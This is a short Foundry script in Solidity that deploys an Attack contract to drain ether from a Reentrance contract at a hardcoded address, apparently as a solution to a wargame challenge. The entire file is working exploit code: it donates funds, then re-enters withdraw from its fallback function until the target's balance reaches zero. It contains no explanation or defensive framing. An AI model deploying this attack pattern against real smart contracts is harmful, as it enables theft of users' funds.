// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import "../src/Reentrance.sol";

contract ReentranceScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        Attack a = new Attack{value: 0.02 ether}();
        a.drainFunds();

        vm.stopBroadcast();
    }
}

contract Attack {
    Reentrance target;
    constructor() public payable {}

    function drainFunds() external {
        target = Reentrance(0xa1cB757DfD0faB3C1050A2f86e444552A430a851);
        console.logUint(address(target).balance);
        target.donate{value: 0.01 ether}(address(this));
        target.withdraw(0.001 ether);
    }

    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw(0.001 ether);
        } else {
            console.logUint(address(target).balance);
        }
    }
}